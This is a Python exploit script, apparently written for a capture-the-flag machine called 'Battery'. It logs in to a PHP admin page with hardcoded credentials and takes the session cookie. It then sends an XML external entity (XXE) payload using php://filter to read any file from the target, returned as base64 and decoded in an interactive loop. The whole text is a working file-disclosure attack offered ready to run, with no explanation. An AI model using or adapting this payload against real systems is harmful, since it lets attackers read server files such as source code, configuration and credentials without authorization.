#!/usr/bin/env python3

import requests
import re
from base64 import b64decode
import argparse

parser = argparse.ArgumentParser(description='Battery XXE')
parser.add_argument('-u', help='Target Host (Eg: 10.10.10.10)', required=True)
args = parser.parse_args()

url = args.u
s = requests.Session()

def get_cookie(url):
	#Login to get the cookie
	new_url = "http://" + url + "/admin.php"
	data = "uname=admin%40bank.a&password=password&btn=Submit"
	headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
	login = s.post(new_url, data=data, headers=headers)
	
	#Perform a GET request to grab the cookie
	tmp_url = "http://" + url + "/dashboard.php"
	get_request = s.get(tmp_url)
	find = str(get_request.request.headers)
	cookie = re.search("(?<=\=)(.*?)(?=\')", find).group(1)
	return cookie

def get_b64(url, cookie, file):
	#Use the XXE to grab files
	t_url = "http://" + url + "/forms.php"
	data = f'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE  root [<!ENTITY read SYSTEM "php://filter/convert.base64-encode/resource={file}" >]>\n<root>\n<name>test</name>\n<search>&read;</search>\n</root>'
	headers = {'Content-Type' : 'text/plain;charset=UTF-8',
			'Cookie' : f'PHPSESSID={cookie}'
	}
	r = s.post(t_url, data=data, headers=headers)
	response = r.text
	b64 = re.search("(?<= number )(.*)(?= is )", response).group(1)
	return b64decode(b64)

while True:
	print("Enter A File Name or Enter \"quit\" To Exit")
	file = input("> ")
	try:
		output = get_b64(url, get_cookie(url), file)
		print(output.decode())
	except:
		print("ERROR")
	if file.lower() == "quit":
		break